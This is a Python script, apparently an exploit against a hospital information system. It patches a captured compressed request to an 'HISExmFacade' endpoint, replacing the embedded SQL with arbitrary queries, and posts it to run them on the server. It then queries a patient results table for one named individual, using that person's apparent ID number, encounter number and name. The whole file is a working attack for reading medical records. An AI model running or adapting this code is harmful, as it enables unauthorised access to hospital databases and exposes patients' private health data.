from his_client_final import HISClient
import requests
import zlib

class CandidateSearcher(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-]. SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = CandidateSearcher()
hidno = 'C221748019'
encntno = '75176986'
name = '李翊寧'

print(f"1. Searching PAT_RESULTH for HIDNO {hidno}...")
sql_hid = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID = '{hidno}' OR PRH_PAT_ALTID = '{hidno}'"
res_hid = searcher.execute_sql(sql_hid)
if res_hid and "<NewDataSet>" in res_hid:
    print("[+] Found by HIDNO!")
    print(res_hid[:500])
else:
    print("[-] Not found by HIDNO.")

print(f"\n2. Searching PAT_RESULTH for ENCNTNO {encntno}...")
# ENCNTNO might be PRH_PAT_ID or PRH_ORDER_NO or similar
sql_enc = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID = '{encntno}' OR PRH_ORDER_NO LIKE '%{encntno}%'"
res_enc = searcher.execute_sql(sql_enc)
if res_enc and "<NewDataSet>" in res_enc:
    print("[+] Found by ENCNTNO!")
    print(res_enc[:500])
else:
    print("[-] Not found by ENCNTNO.")
